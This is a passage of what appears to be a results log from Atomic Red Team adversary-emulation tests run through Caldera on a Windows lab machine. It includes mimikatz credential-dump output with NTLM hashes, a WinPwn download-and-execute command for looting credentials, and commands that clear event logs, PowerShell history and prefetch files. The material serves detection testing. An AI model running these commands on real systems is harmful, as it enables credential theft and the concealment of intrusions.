:\t\tcredman :\tAuthentication Id : 0 ; 77890 (00000000:00013042)Session           : Batch from 0User Name         : puma-4Domain            : DESKTOP-9LD827ILogon Server      : DESKTOP-9LD827ILogon Time        : 3/4/2024 7:48:24 PMSID               : S-1-5-21-2334472832-2587113924-773976260-1001\tmsv :\t\t [00000003] Primary\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * NTLM     : 4713984be0a9c3038e4bd6b01e3a2f80\t * SHA1     : 84e755f7536c91eaeecef494c468a1aab27fa2fc\t * DPAPI    : 84e755f7536c91eaeecef494c468a1aa\ttspkg :\t\twdigest :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tkerberos :\t\t * Username : puma-4\t * Domain   : DESKTOP-9LD827I\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-19\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tkerberos :\t\t * Username : (null)\t * Domain   : (null)\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 55583 (00000000:0000d91f)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 55226 (00000000:0000d7ba)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-90-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-20\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\t\tcredman :\tAuthentication Id : 0 ; 33712 (00000000:000083b0)Session           : Interactive from 1User Name         : UMFD-1Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-96-0-1\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 33679 (00000000:0000838f)Session           : Interactive from 0User Name         : UMFD-0Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-96-0-0\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 32502 (00000000:00007ef6)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : \tmsv :\t\ttspkg :\t\twdigest :\t\tkerberos :\t\tssp :\t\tcredman :\tAuthentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : DESKTOP-9LD827I$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 3/4/2024 7:48:23 PMSID               : S-1-5-18\tmsv :\t\ttspkg :\t\twdigest :\t\t * Username : DESKTOP-9LD827I$\t * Domain   : WORKGROUP\t * Password : (null)\tkerberos :\t\t * Username : desktop-9ld827i$\t * Domain   : WORKGROUP\t * Password : (null)\tssp :\t\tcredman :\tmimikatz(powershell) # exitBye!']",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); obfuskittiedump -consoleoutput -noninteractive""]",['Loot local Credentials - powerhell kittie technique via function of WinPwn'],['WinPwn - Loot local Credentials - powerhell kittie'],"[{'tactic': 'multiple', 'technique_name': 'Valid Accounts: Local Accounts', 'technique_id': 'T1078.003'}]",['windows'],['psh']
408,Initial-Success,collection,collection :: Data Staged: Local Data Staging,collection :: ['Stage data from Discovery.bat'],collection :: T1074.001,operation__atomic_windows_depfalse_pshtrue__t1074_001__collection__data_staged-_local_data_staging__4382d53f0f53399e72c728d019fffd77__SAVED_2024-03-07_093003,atomic_windows_depfalse_pshtrue__t1074_001__collection__data_staged-_local_data_staging__4382d53f0f53399e72c728d019fffd77,['4382d53f0f53399e72c728d019fffd77'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"" -OutFile $env:TEMP\\discovery.bat']","['Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n']",['Stage data from Discovery.bat'],"[{'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}]",['windows'],['psh']
413,Initial-Success,command-and-control,command-and-control :: Application Layer Protocol: Web Protocols,command-and-control :: ['Malicious User Agents - Powershell'],command-and-control :: T1071.001,operation__atomic_windows_depfalse_pshtrue__t1071_001__command-and-control__application_layer_protocol-_web_protocols__ef2c951840423ba90c208867dcf89c87__SAVED_2024-03-07_085200,atomic_windows_depfalse_pshtrue__t1071_001__command-and-control__application_layer_protocol-_web_protocols__ef2c951840423ba90c208867dcf89c87,['ef2c951840423ba90c208867dcf89c87'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Invoke-WebRequest www.google.com -UserAgent ""HttpBrowser/1.0"" | out-null; Invoke-WebRequest www.google.com -UserAgent ""Wget/1.9+cvs-stable (Red Hat modified)"" | out-null; Invoke-WebRequest www.google.com -UserAgent ""Opera/8.81 (Windows NT 6.0; U; en)"" | out-null; Invoke-WebRequest www.google.com -UserAgent ""*<|>*"" | out-null']","['This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n']",['Malicious User Agents - Powershell'],"[{'tactic': 'command-and-control', 'technique_name': 'Application Layer Protocol: Web Protocols', 'technique_id': 'T1071.001'}]",['windows'],['psh']
414,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host,defense-evasion :: ['Indicator Manipulation using FSUtil'],defense-evasion :: T1070,operation__atomic_windows_depfalse_pshtrue__t1070__defense-evasion__indicator_removal_on_host__cea891e7c3c3efe3723eca495d261472__SAVED_2024-03-07_084521,atomic_windows_depfalse_pshtrue__t1070__defense-evasion__indicator_removal_on_host__cea891e7c3c3efe3723eca495d261472,['cea891e7c3c3efe3723eca495d261472'],1,0,1,[1],['    Directory: C:\\Users\\puma-4\\Desktop\\ExternalPayloadsMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 -a----          3/7/2024   8:43 AM              0 T1070-2.txt                                                          Zero data is changed'],[''],['0'],"['if (-not (Test-Path ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"")) { New-Item ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt"" -Force } ; echo ""1234567890"" > ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt""; fsutil  file setZeroData offset=0 length=10 ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt""']","[""Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n- https://tria.ge/230601-x8x6bsgb24/behavioral2\n""]",['Indicator Manipulation using FSUtil'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host', 'technique_id': 'T1070'}]",['windows'],['psh']
415,Initial-Success,defense-evasion,defense-evasion :: Email Collection: Mailbox Manipulation,defense-evasion :: ['Copy and Modify Mailbox Data on Windows'],defense-evasion :: T1070.008,operation__atomic_windows_depfalse_pshtrue__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__bdc2a80d621d3361ea727008644b1d15__SAVED_2024-03-07_083842,atomic_windows_depfalse_pshtrue__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__bdc2a80d621d3361ea727008644b1d15,['bdc2a80d621d3361ea727008644b1d15'],1,0,1,[1],['    Directory: C:\\Users\\puma-4\\AppData\\Local\\Comms\\Unistore\\dataMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/7/2024   8:36 AM                copy                                                                 '],[''],['0'],"['New-Item -Path ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy"" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy"" -Recurse -Force -ErrorAction Ignore }; Get-ChildItem -Path ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy"" -File | ForEach-Object { Add-Content -Path $_.FullName -Value ""Modification for Atomic Red Test"" -ErrorAction Ignore }']",['Copies and modifies mail data on Windows\n'],['Copy and Modify Mailbox Data on Windows'],"[{'tactic': 'defense-evasion', 'technique_name': 'Email Collection: Mailbox Manipulation', 'technique_id': 'T1070.008'}]",['windows'],['psh']
416,Initial-Success,defense-evasion,defense-evasion :: Email Collection: Mailbox Manipulation,defense-evasion :: ['Copy and Delete Mailbox Data on Windows'],defense-evasion :: T1070.008,operation__atomic_windows_depfalse_pshtrue__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__9d03b18c922b94ebba44d25c430e6e95__SAVED_2024-03-07_083207,atomic_windows_depfalse_pshtrue__t1070_008__defense-evasion__email_collection-_mailbox_manipulation__9d03b18c922b94ebba44d25c430e6e95,['9d03b18c922b94ebba44d25c430e6e95'],1,0,1,[1],['    Directory: C:\\Users\\puma-4\\AppData\\Local\\Comms\\Unistore\\dataMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/7/2024   8:29 AM                copy                                                                 '],[''],['0'],"['New-Item -Path ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy"" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy"" -Recurse -Force -ErrorAction Ignore }; Remove-Item -Path ""C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy"" -Recurse -Force -ErrorAction Ignore']",['Copies and deletes mail data on Windows\n'],['Copy and Delete Mailbox Data on Windows'],"[{'tactic': 'defense-evasion', 'technique_name': 'Email Collection: Mailbox Manipulation', 'technique_id': 'T1070.008'}]",['windows'],['psh']
422,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: File Deletion,defense-evasion :: ['Delete TeamViewer Log Files'],defense-evasion :: T1070.004,operation__atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__b0026f9a57639c049490a43d623d7695__SAVED_2024-03-07_075218,atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__b0026f9a57639c049490a43d623d7695,['b0026f9a57639c049490a43d623d7695'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null; Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore'],"['Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n']",['Delete TeamViewer Log Files'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: File Deletion', 'technique_id': 'T1070.004'}]",['windows'],['psh']
424,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: File Deletion,defense-evasion :: ['Delete Prefetch File'],defense-evasion :: T1070.004,operation__atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__2413b013bc82d152765e2ac34601a327__SAVED_2024-03-07_073901,atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__2413b013bc82d152765e2ac34601a327,['2413b013bc82d152765e2ac34601a327'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Remove-Item -Path (Join-Path ""$Env:SystemRoot\\prefetch\\"" (Get-ChildItem -Path ""$Env:SystemRoot\\prefetch\\*.pf"" -Name)[0])']","['Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run ""(Get-ChildItem -Path ""$Env:SystemRoot\\prefetch\\*.pf"" | Measure-Object).Count""\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n']",['Delete Prefetch File'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: File Deletion', 'technique_id': 'T1070.004'}]",['windows'],['psh']
426,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: Clear Command History,defense-evasion :: ['Prevent Powershell History Logging'],defense-evasion :: T1070.003,operation__atomic_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__df94858e92a23d274ac1d70133d9150f__SAVED_2024-03-07_072540,atomic_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__df94858e92a23d274ac1d70133d9150f,['df94858e92a23d274ac1d70133d9150f'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Set-PSReadlineOption -HistorySaveStyle SaveNothing'],['Prevents Powershell history\n'],['Prevent Powershell History Logging'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Clear Command History', 'technique_id': 'T1070.003'}]",['windows'],['psh']
427,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: Clear Command History,defense-evasion :: ['Clear Powershell History by Deleting History File'],defense-evasion :: T1070.003,operation__atomic_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__adce11c81bb77ae74660c6c743a0442d__SAVED_2024-03-07_071856,atomic_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__adce11c81bb77ae74660c6c743a0442d,['adce11c81bb77ae74660c6c743a0442d'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Remove-Item (Get-PSReadlineOption).HistorySavePath'],['Clears Powershell history\n'],['Clear Powershell History by Deleting History File'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Clear Command History', 'technique_id': 'T1070.003'}]",['windows'],['psh']
428,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: Clear Command History,defense-evasion :: ['Set Custom AddToHistoryHandler to Avoid History File Logging'],defense-evasion :: T1070.003,operation__atomic_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__18d69a8fd988d6b63f5307ce857723c9__SAVED_2024-03-07_071219,atomic_windows_depfalse_pshtrue__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__18d69a8fd988d6b63f5307ce857723c9,['18d69a8fd988d6b63f5307ce857723c9'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Set-PSReadLineOption -AddToHistoryHandler { return $false }'],"['The ""AddToHistoryHandler"" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n']",['Set Custom AddToHistoryHandler to Avoid History File Logging'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Clear Command History', 'technique_id': 'T1070.003'}]",['windows'],['psh']
429,Initial-Success,defense-evasion,defense-evasion :: Indicator Removal on Host: Clear Windows Event Logs,defense-evasion :: ['Delete System Logs Using Clear-EventLog'],defense-evasion :: T1070.001,operation__atomic_windows_depfalse_pshtrue__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__6fa417fb183d6c20a67e617c0249f04f__SAVED_2024-03-07_070541,atomic_windows_depfalse_pshtrue__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__6fa417fb183d6c20a67e617c0249f04f,['6fa417fb183d6c20a67e617c0249f04f'],1,0,1,[1],"['  Max(K) Retain OverflowAction        Entries Log                                                                        ------ ------ --------------        ------- ---                                                                        20,480      0 OverwriteAsNeeded           0 Application                                                                20,480      0 OverwriteAsNeeded           0 HardwareEvents                                                                512      7 OverwriteOlder              0 Internet Explorer                                                          20,480      0 OverwriteAsNeeded           0 Key Management Service                                                     20,480      0 OverwriteAsNeeded           1 Security                                                                   20,480      0 OverwriteAsNeeded           2 System                                                                     15,360      0 OverwriteAsNeeded           0 Windows PowerShell                                                       ']",[''],['0'],['$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }; Get-EventLog -list'],"['Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n']",['Delete System Logs Using Clear-EventLog'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Clear Windows Event Logs', 'technique_id': 'T1070.001'}]",['windows'],['psh']
441,Initial-Success,discovery,discovery :: Permission Groups Discovery: Local Groups,discovery :: ['Permission Groups Discovery PowerShell (Local)'],discovery :: T1069.001,operation__atomic_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__f5b4c02bae169cb3a62ac26bb80321d6__SAVED_2024-03-07_054547,atomic_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__f5b4c02bae169cb3a62ac26bb80321d6,['f5b4c02bae169cb3a62ac26bb80321d6'],1,0,1,[1],"['Name                                Description                                                                        ----                                -----------                                                                        Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...Administrators                      Administrators have complete and unrestricted access to the computer/domain        Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...Cryptographic Operators             Members are authorized to perform cryptographic operations.                        Device Owners                       Members of this group can change system-wide settings.                             Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...Event Log Readers                   Members of this group can read event logs from local machine                       Guests                              Guests have the same access as members of the Users group by default, except for...Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...IIS_IUSRS                           Built-in group used by Internet Information Services.                              Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...Performance Monitor Users           Members of this group can access performance counter data locally and remotely     Power Users                         Power Users are included for backwards compatibility and possess limited adminis...Remote Desktop Users                Members in this group are granted the right to logon remotely                      Remote Management Users             Members of this group can access WMI resources over management protocols (such a...Replicator                          Supports file replication in a domain                                              System Managed Accounts Group       Members of this group are managed by the system.                                   Users                               Users are prevented from making accidental or intentional system-wide changes an...Name            : DESKTOP-9LD827I\\AdministratorSID             : S-1-5-21-2334472832-2587113924-773976260-500PrincipalSource : LocalObjectClass     : UserName            : DESKTOP-9LD827I\\puma-4SID             : S-1-5-21-2334472832-2587113924-773976260-1001PrincipalSource : LocalObjectClass     : User']",[''],['0'],"['get-localgroup; Get-LocalGroupMember -Name ""Administrators""']","['Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n']",['Permission Groups Discovery PowerShell (Local)'],"[{'tactic': 'discovery', 'technique_name': 'Permission Groups Discovery: Local Groups', 'technique_id': 'T1069.001'}]",['windows'],['psh']
442,Initial-Success,discovery,discovery :: Permission Groups Discovery: Local Groups,discovery :: ['WMIObject Group Discovery'],discovery :: T1069.001,operation__atomic_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__e541c2b62c3259680863a6f3b410e59a__SAVED_2024-03-07_053912,atomic_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__e541c2b62c3259680863a6f3b410e59a,['e541c2b62c3259680863a6f3b410e59a'],1,0,1,[1],['Caption                                             Domain          Name                                SID         -------                                             ------          ----                                ---         DESKTOP-9LD827I\\Access Control Assistance Operators DESKTOP-9LD827I Access Control Assistance Operators S-1-5-32-579DESKTOP-9LD827I\\Administrators                      DESKTOP-9LD827I Administrators                      S-1-5-32-544DESKTOP-9LD827I\\Backup Operators                    DESKTOP-9LD827I Backup Operators                    S-1-5-32-551DESKTOP-9LD827I\\Cryptographic Operators             DESKTOP-9LD827I Cryptographic Operators             S-1-5-32-569DESKTOP-9LD827I\\Device Owners                       DESKTOP-9LD827I Device Owners                       S-1-5-32-583DESKTOP-9LD827I\\Distributed COM Users               DESKTOP-9LD827I Distributed COM Users               S-1-5-32-562DESKTOP-9LD827I\\Event Log Readers                   DESKTOP-9LD827I Event Log Readers                   S-1-5-32-573DESKTOP-9LD827I\\Guests                              DESKTOP-9LD827I Guests                              S-1-5-32-546DESKTOP-9LD827I\\Hyper-V Administrators              DESKTOP-9LD827I Hyper-V Administrators              S-1-5-32-578DESKTOP-9LD827I\\IIS_IUSRS                           DESKTOP-9LD827I IIS_IUSRS                           S-1-5-32-568DESKTOP-9LD827I\\Network Configuration Operators     DESKTOP-9LD827I Network Configuration Operators     S-1-5-32-556DESKTOP-9LD827I\\Performance Log Users               DESKTOP-9LD827I Performance Log Users               S-1-5-32-559DESKTOP-9LD827I\\Performance Monitor Users           DESKTOP-9LD827I Performance Monitor Users           S-1-5-32-558DESKTOP-9LD827I\\Power Users                         DESKTOP-9LD827I Power Users                         S-1-5-32-547DESKTOP-9LD827I\\Remote Desktop Users                DESKTOP-9LD827I Remote Desktop Users                S-1-5-32-555DESKTOP-9LD827I\\Remote Management Users             DESKTOP-9LD827I Remote Management Users             S-1-5-32-580DESKTOP-9LD827I\\Replicator                          DESKTOP-9LD827I Replicator                          S-1-5-32-552DESKTOP-9LD827I\\System Managed Accounts Group       DESKTOP-9LD827I System Managed Accounts Group       S-1-5-32-581DESKTOP-9LD827I\\Users                               DESKTOP-9LD827I Users                               S-1-5-32-545'],[''],['0'],['Get-WMIObject Win32_Group'],"['Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n']",['WMIObject Group Discovery'],"[{'tactic': 'discovery', 'technique_name': 'Permission Groups Discovery: Local Groups', 'technique_id': 'T1069.001'}]",['windows'],['psh']
444,Initial-Success,execution,execution :: Command and Scripting Interpreter: Visual Basic,execution :: ['Visual Basic script execution to gather local computer information'],execution :: T1059.005,operation__atomic_windows_depfalse_pshtrue__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__f2131e45dbd95e3057bd3494b5aeed41__SAVED_2024-03-07_052551,atomic_windows_depfalse_pshtrue__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__f2131e45dbd95e3057bd3494b5aeed41,['f2131e45dbd95e3057bd3494b5aeed41'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['cscript ""a771e6_sys_info.vbs"" > $env:TEMP\\T1059.005.out.txt']","['Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.']",['Visual Basic script execution to gather local computer information'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: Visual Basic', 'technique_id': 'T1059.005'}]",['windows'],['psh']
448,Initial-Success,execution,execution :: Command and Scripting Interpreter: Windows Command Shell,execution :: ['Simulate BlackByte Ransomware Print Bombing'],execution :: T1059.003,operation__atomic_windows_depfalse_pshtrue__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__942d94dff3cc494bacf5517e775321a7__SAVED_2024-03-07_045915,atomic_windows_depfalse_pshtrue__t1059_003__execution__command_and_scripting_interpreter-_windows_command_shell__942d94dff3cc494bacf5517e775321a7,['942d94dff3cc494bacf5517e775321a7'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['cmd /c ""for /l %x in (1,1,75) do start wordpad.exe /p PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt"" | out-null']","[""This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n""]",['Simulate BlackByte Ransomware Print Bombing'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: Windows Command Shell', 'technique_id': 'T1059.003'}]",['windows'],['psh']
455,Initial-Success,execution,execution :: Command and Scripting Interpreter: PowerShell,execution :: ['PowerUp Invoke-AllChecks'],execution :: T1059.001,operation__atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__ba763ea19604a73e3e1f9d9d8d86d9cc__SAVED_2024-03-07_041229,atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__ba763ea19604a73e3e1f9d9d8d86d9cc,['ba763ea19604a73e3e1f9d9d8d86d9cc'],1,0,1,[1],['Check                                    -----                                    User Has Local Admin Privileges          User In Local Group with Admin PrivilegesProcess Token Privileges                 Process Token Privileges                 Process Token Privileges                 Process Token Privileges                 Process Token Privileges                 Process Token Privileges                 Process Token Privileges                 Process Token Privileges                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 Modifiable Service Files                 